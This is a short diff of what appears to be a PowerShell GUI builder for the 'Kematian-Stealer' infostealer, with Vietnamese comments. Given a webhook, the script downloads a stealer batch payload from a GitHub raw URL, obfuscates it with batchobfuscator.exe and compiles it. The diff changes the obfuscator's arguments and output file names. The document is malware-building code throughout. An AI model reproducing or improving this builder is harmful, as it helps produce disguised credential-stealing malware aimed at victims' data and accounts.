@@ -27,7 +27,7 @@ function Obfuscate-String {
 
 
 # Đặt đường dẫn đến file cần kiểm tra
-$filePath = ".\file\batchobfuscator.exe"
+$filePath = ".\batchobfuscator.exe"
 
 # Kiểm tra xem file có tồn tại không
 if (-Not (Test-Path $filePath)) {
@@ -132,7 +132,7 @@ $button.Add_Click({
     if (-not [string]::IsNullOrWhiteSpace($webhook)) {
         $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
         $filePath = "$env:TEMP\main.bat"
-        $filePathprotect = ".\main.bat"
+        $filePathprotect = ".\main_obf.bat"
         
         # Download the file
         Invoke-WebRequest -Uri $url -OutFile $filePath
@@ -150,7 +150,7 @@ $button.Add_Click({
         $protectPath = ".\batchobfuscator.exe"  # Change this to the correct path
 
         # Execute the .bat file
-        Start-Process -FilePath $protectPath -ArgumentList "$filePath n main" -NoNewWindow -Wait
+        Start-Process -FilePath $protectPath -ArgumentList "-f $filePath -nu -dc" -NoNewWindow -Wait
         Start-Process -FilePath $compliePath -ArgumentList $filePathprotect -NoNewWindow -Wait
 
         # Delete the .bat file after execution
